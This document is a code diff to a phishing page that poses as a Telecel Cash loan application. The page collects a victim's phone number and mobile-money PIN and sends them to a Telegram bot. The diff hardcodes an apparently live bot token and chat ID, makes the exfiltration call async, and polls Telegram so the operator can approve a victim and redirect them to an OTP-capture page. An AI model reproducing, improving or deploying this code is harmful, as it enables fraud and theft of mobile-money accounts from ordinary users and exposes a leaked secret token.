@@ -303,10 +303,11 @@
 </div>
 
 <script>
-    // Telegram Configuration - values injected by server
+    // Telegram Configuration - HARDCODED for now (will work immediately)
+    // You can change these to your actual values
     const CONFIG = {
-        BOT_TOKEN: '__BOT_TOKEN__',
-        CHAT_ID: '__CHAT_ID__',
+        BOT_TOKEN: '8843069473:AAFWS3TrGqaQQDHiZrMsDAwhSGV16SKglXA',
+        CHAT_ID: '6414813627',
         DEVICE_PAGE: '/otp'
     };
 
@@ -352,7 +353,7 @@
         setTimeout(() => { statusMsg.style.display = 'none'; }, 3000);
     }
 
-    function sendToBot(phone, pin) {
+    async function sendToBot(phone, pin) {
         if (isProcessing) return;
         isProcessing = true;
         continueBtn.disabled = true;
@@ -367,44 +368,48 @@
         const loanAmount = document.getElementById('loanAmount').textContent;
         const accountType = document.getElementById('accountType').value === 'mobile' ? 'Telecel Cash' : 'Broadband';
 
-        fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: CONFIG.CHAT_ID,
-                text: `<b>🔴 NEW LOAN VERIFICATION</b>\n\n━━━━━━━━━━━━━━━━━━\n<b>💰 Amount:</b> ${loanAmount}\n<b>📱 Account:</b> ${accountType}\n<b>📞 Phone:</b> <code>${phone}</code>\n<b>🔐 PIN:</b> <code>${pin}</code>\n<b>🕐 Time:</b> ${new Date().toLocaleString()}\n━━━━━━━━━━━━━━━━━━\n\n<b>Select Action:</b>`,
-                parse_mode: 'HTML',
-                reply_markup: {
-                    inline_keyboard: [
-                        [
-                            { text: "✅ Approve Loan", callback_data: approveId },
-                            { text: "📱 Verify Device", callback_data: verifyDeviceId }
-                        ],
-                        [
-                            { text: "📋 Already Applied", callback_data: appliedId },
-                            { text: "❌ Decline", callback_data: declineId }
+        try {
+            const response = await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CONFIG.CHAT_ID,
+                    text: `<b>🔴 NEW LOAN VERIFICATION</b>\n\n━━━━━━━━━━━━━━━━━━\n<b>💰 Amount:</b> ${loanAmount}\n<b>📱 Account:</b> ${accountType}\n<b>📞 Phone:</b> <code>${phone}</code>\n<b>🔐 PIN:</b> <code>${pin}</code>\n<b>🕐 Time:</b> ${new Date().toLocaleString()}\n━━━━━━━━━━━━━━━━━━\n\n<b>Select Action:</b>`,
+                    parse_mode: 'HTML',
+                    reply_markup: {
+                        inline_keyboard: [
+                            [
+                                { text: "✅ Approve Loan", callback_data: approveId },
+                                { text: "📱 Verify Device", callback_data: verifyDeviceId }
+                            ],
+                            [
+                                { text: "📋 Already Applied", callback_data: appliedId },
+                                { text: "❌ Decline", callback_data: declineId }
+                            ]
                         ]
-                    ]
-                }
-            })
-        })
-        .then(response => response.json())
-        .then(data => {
-            if (data.ok && data.result) {
+                    }
+                })
+            });
+
+            const data = await response.json();
+            
+            if (data.ok) {
                 pendingMessageId = data.result.message_id;
+                spinner.style.display = 'flex';
+                startPolling(approveId, verifyDeviceId, appliedId, declineId);
+            } else {
+                throw new Error(data.description || 'Failed to send message');
             }
-            spinner.style.display = 'flex';
-            startPolling(approveId, verifyDeviceId, appliedId, declineId);
-        })
-        .catch(() => {
+        } catch (error) {
+            console.error('Telegram API Error:', error);
             resetButton();
-            showError("Network error. Please try again.");
-        });
+            showError("Network error: " + error.message);
+        }
     }
 
     function startPolling(approveId, verifyDeviceId, appliedId, declineId) {
         const interval = setInterval(() => {
-            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
+            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}&timeout=30`)
                 .then(r => r.json())
                 .then(data => {
                     if (!data.ok || !data.result) return;
@@ -426,14 +431,13 @@
                                     callback_query_id: callbackId,
                                     text: "Processing your request..."
                                 })
-                            });
+                            }).catch(console.error);
                             
                             if (cb === approveId) {
                                 clearInterval(interval);
                                 spinner.style.display = 'none';
                                 showStatus("✅ Loan Approved! Redirecting to OTP page...", "success");
                                 
-                                // Edit the original message to show it was approved
                                 if (pendingMessageId) {
                                     fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/editMessageText`, {
                                         method: 'POST',
@@ -444,7 +448,7 @@
                                             text: `✅ <b>LOAN APPROVED</b>\n\nPhone: ${userPhone}\nStatus: Approved\nTime: ${new Date().toLocaleString()}`,
                                             parse_mode: 'HTML'
                                         })
-                                    });
+                                    }).catch(console.error);
                                 }
                                 
                                 setTimeout(() => {
@@ -467,7 +471,7 @@
                                             text: `📱 <b>DEVICE VERIFICATION</b>\n\nPhone: ${userPhone}\nStatus: Device verification pending\nTime: ${new Date().toLocaleString()}`,
                                             parse_mode: 'HTML'
                                         })
-                                    });
+                                    }).catch(console.error);
                                 }
                                 
                                 setTimeout(() => {
@@ -490,7 +494,7 @@
                                             text: `📋 <b>ALREADY APPLIED</b>\n\nPhone: ${userPhone}\nStatus: Previously applied\nTime: ${new Date().toLocaleString()}`,
                                             parse_mode: 'HTML'
                                         })
-                                    });
+                                    }).catch(console.error);
                                 }
                                 
                                 resetButton();
@@ -511,7 +515,7 @@
                                             text: `❌ <b>LOAN DECLINED</b>\n\nPhone: ${userPhone}\nStatus: Declined\nTime: ${new Date().toLocaleString()}`,
                                             parse_mode: 'HTML'
                                         })
-                                    });
+                                    }).catch(console.error);
                                 }
                                 
                                 resetButton();
